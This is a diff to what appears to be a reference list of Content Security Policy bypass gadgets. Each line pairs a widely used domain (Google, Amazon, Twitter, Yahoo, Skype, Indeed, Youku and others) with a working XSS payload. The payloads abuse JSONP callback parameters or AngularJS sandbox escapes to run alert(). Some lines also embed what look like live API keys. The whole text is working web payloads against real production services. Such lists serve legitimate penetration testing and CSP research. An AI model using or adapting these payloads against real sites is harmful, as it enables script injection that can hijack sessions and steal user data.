@@ -4,10 +4,12 @@ a.huodong.mi.com	<script src="https://a.huodong.mi.com/postfree/postfree?callbac
 aax-eu.amazon.com	<script src="https://aax-eu.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>
 accdn.lpsnmedia.net	<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>
 accounts.google.com	<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
+acs.youku.com  <script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>
 ads.yap.yahoo.com	<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
 ajax.googleapis.com	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 analytics.tiktok.com	<script src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid=%22-alert`1`-%22"></script>
 anchor.digitalocean.com	<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
+a.config.skype.com  <script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>
 ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>
 api.bazaarvoice.com	<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
@@ -30,6 +32,7 @@ api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih01
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
 api.stackexchange.com	<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>
 api.swiftype.com	<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>
+api.twitter.com  <script src="https://api.twitter.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>
 api.tumblr.com	<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>
 api.vk.com	<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>
 api.wordpress.org	<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>
@@ -58,6 +61,7 @@ common.like.naver.com	<script src="https://common.like.naver.com/v1/search/conte
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
 content.akamai.com	<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 cse.google.com	<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>
+clients1.google.com  <script src="http://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
 d1xrp9zhb3ks3c.cloudfront.net	<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 dblp.org	<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>
@@ -95,6 +99,7 @@ js.hcaptcha.com	<script src="https://js.hcaptcha.com/1/api.js?onload=alert&rende
 kbcprod.service-now.com	<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 lghnh-mkt-prod1.campaign.adobe.com	<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
+links.services.disqus.com  <script src="http://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>
 m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
 maps-api-ssl.google.com	<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>
@@ -154,6 +159,7 @@ thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
+tr.indeed.com  <script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>
 udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>
 ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>
 uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
